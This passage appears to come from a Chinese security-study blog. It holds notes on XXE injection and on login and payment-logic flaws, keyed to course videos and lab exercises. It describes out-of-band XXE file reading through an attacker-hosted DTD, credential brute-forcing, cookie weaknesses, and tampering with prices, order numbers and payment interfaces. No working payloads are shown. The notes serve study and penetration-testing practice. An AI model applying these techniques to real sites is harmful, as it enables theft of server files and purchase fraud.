Company作为一个常量值在XML文档中使用。<br>6、!XXE攻击利用了XML解析器对外部实体的支持，攻击者构造恶意的XML文档，其中包含对外部实体的引用。当解析器解析这个恶意的XML文档时，会尝试加载外部实体，攻击者可以利用这个机制来读取敏感文件、执行远程请求等。</p>
<h3 id="XML和XXE区别"><a href="#XML和XXE区别" class="headerlink" title="XML和XXE区别"></a>XML和XXE区别</h3><p>1、XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。<br>2、XXE 漏洞全称XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
<h3 id="XML-与-HTML-的主要差异："><a href="#XML-与-HTML-的主要差异：" class="headerlink" title="XML 与 HTML 的主要差异："></a>XML 与 HTML 的主要差异：</h3><p>1、XML 被设计为传输和存储数据,其焦点是数据的内容。<br>2、HTML 被设计用来显示数据,其焦点是数据的外观。<br>3、HTML 旨在显示信息,而 XML 旨在传输信息。</p>
<h3 id="xxe攻击流程"><a href="#xxe攻击流程" class="headerlink" title="xxe攻击流程:"></a>xxe攻击流程:</h3><p>攻击者构造恶意的XML文档，其中包含对外部实体的引用。<br>攻击者将恶意的XML文档发送给目标系统，触发XML解析器解析。<br>XML解析器在解析过程中尝试加载外部实体。<br>如果加载成功，攻击者可以读取外部实体的内容，例如敏感文件的内容。<br>攻击者可以利用外部实体的内容进行进一步的攻击，例如执行远程请求。</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">pikachu靶场XML-知识点:回显，玩法，协议，引入:4:40</a><br>1、XML|DTD学习:<br><a href="https://blog.csdn.net/lxz352907839/article/details/127531994">https://blog.csdn.net/lxz352907839/article/details/127531994</a><br><a href="https://www.cnblogs.com/ForEvErNoME/p/2373384.html">https://www.cnblogs.com/ForEvErNoME/p/2373384.html</a><br>2、引入外部实体DTD：会将DTD文件的内容当作XML代码执行。<br>(1)条件:对方网站没有禁止引入外部实体DTD。<br>(2)类似于远程文件包含,可以自定义代码攻击,可以绕过一些防御的软件或者代码(payload中的ip改为自己的)。<br>3、无回显情况(反向连接的思路)<br>通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了。(就是构造这样的payload:让对方服务器去请求某一个目标文件,然后让他访问我们自己的IP下的DTD文件,随后我们可以在这个DTD文件里设计访问日志或者构造php文件接收来查看数据)。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">xxe|协议-读文件(绕过对方的过滤)–思路:30:45</a><br>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">xxe-lab靶场登录框xml数据传输测试–检测发现xxe:35:40</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">CTF-Jarvis-OJ-Web-XXE|真题|数据请求格式:46:50</a><br>1、这里就是盲猜,把type值改为application&#x2F;xml然后构造payload放进去看有没有被执行。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">CTF-Vulnhub(非vulhub)-XXE安全漏洞复现(重点)-实战:50:22</a><br>1、vulnhub更贴近实战,但是对内存要求较高。<br>2、用file协议读取文件需要这个文件的完整路径(绝对路径),但是用php的去读取只需文件名(相对路径,默认在当前目录(注意不是根目录)下找目标文件)。<br>3、”.&#x2F;“和”..&#x2F;“都是用于指定文件路径的相对路径符号。<br>“.&#x2F;“表示当前目录，用于引用当前目录下的文件或文件夹。例如，”.&#x2F;file.txt”表示当前目录下的file.txt文件。<br>“..&#x2F;“表示上级目录，用于引用上级目录下的文件或文件夹。例如，”..&#x2F;folder&#x2F;file.txt”表示上级目录中的folder文件夹下的file.txt文件。<br>因此，”.&#x2F;“和”..&#x2F;“的区别在于引用的目录位置不同。”.&#x2F;“表示当前目录，而”..&#x2F;“表示上级目录。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=38&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">xxe工具使用-实战:1:20:50</a></p>
<h2 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h2><p><img src="https://pic.imgdb.cn/item/653a84cec458853aeff65266.jpg" alt="图二" title="XXE防御"></p>
]]></content>
  </entry>
  <entry>
    <title>登陆脆弱|支付篡改</title>
    <url>/2023/10/18/zhificuangai/</url>
    <content><![CDATA[<p><img src="https://pic.imgdb.cn/item/652e9c6bc458853aef0bd201.png" alt="图一" title="逻辑越权学习"></p>
<h2 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="登录应用功能点安全问题"></a>登录应用功能点安全问题</h2><p>1.登录点暴力破解<br>2.HTTP&#x2F;HTTPS 传输<br>3.Cookie 脆弱点验证<br>4.Session 固定点测试<br>5.验证密文比对安全测试</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">http与https协议密文抓取:3:30</a><br>(1)、https一般传输数据加密(密码),而http(一般是明文传输)不是。<br>(2)、爆破时,应当注意把payload换成密文。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">后台登录账号密码爆破测试:10:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Cookie 脆弱点验证:21:10</a><br>1、get到一个小知识,就是如果网址的一个属性是?r&#x3D;index而不是存在后缀(?r&#x3D;index.php之类的)的,那么考虑其存在文件包含。<br>2、找cookie脆弱点:<br>白盒:代码审计,发现只要登陆时,cookie不为空就可以成功进入后台,cookie为空就返回登陆界面。<br>黑盒:看数据包的cookie中的参数。</p>
<h3 id="业务"><a href="#业务" class="headerlink" title="业务"></a>业务</h3><p>数据篡改安全问题<br>参考：<a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a><br>商品购买流程：<br>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付<br>常见篡改参数：<br>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等<br>常见修改方法：<br>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">商场系统商品支付逻辑测试–数量、订单编号:40:00</a><br>(1)、感触比较深的是改订单编号的,开两个订单,一个买十件,一个买一件,用一件的编号指向十件的,可以实现低价购。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">建站系统商品支付逻辑测试–价格、商品编号:51:40</a><br>(1)、数据包有一些东西不可乱改,要多抓包,对比,找出能改的字段。<br>(2)、价格应该要存储在数据库中读取出来,而不是给机会给用户可以修改。<br>(3)、token–数据包的唯一性,若果数据包设计了token,那么就应该不会出现改商品编号就能以低价格买高价格的商品的漏洞。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=33&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">支付接口的修改:1:04:00</a><br>(1)、指向自己指定的支付接口。</p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>业务逻辑越权</tag>
      </tags>
  </entry>
</search>
